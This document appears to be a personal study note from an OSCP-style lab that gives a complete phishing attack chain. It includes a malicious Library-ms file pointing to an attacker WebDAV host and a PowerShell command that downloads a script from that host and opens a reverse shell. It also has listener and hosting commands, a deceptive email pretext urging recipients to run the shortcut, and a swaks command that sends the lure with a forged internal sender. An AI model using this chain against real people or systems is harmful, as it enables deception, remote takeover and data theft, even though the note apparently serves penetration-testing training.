<% tp.file.rename("1_phishing")%>


## Creating the Payloads
- config.Library-ms
  This opens our 1st stage dropper like it was a local folder
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://HIP</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

- Payload that belongs into the Library, e.g. an .lnk file
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<HIP>:8000/Invoke-PowershellTcp.ps1'); Invoke-PowershellTcp -Reverse -IPAddress <HIP> -Port 4444"
```

- 1st Stage dropper (shell 1)
Hosting the webdav directory, containing our payload
```bash
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/oscp/lab/webdav/
```

- Create a copy of the library and use that to transfer those two files to kali

## Setup C2

- 2nd Stage dropper (shell 2)
```bash
cd /home/kali/Documents/shells/ && python3 -m http.server 8000
```
> Unstaged msf rev_tcp exe did not work in ATP
> 
- Receive reverse shell (shell 3)
`nc -nvlp 4444`

## Send Phish
- Example contents for body.txt
```
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
```

- Shell 4
```bash
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server $mailServerIP --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```
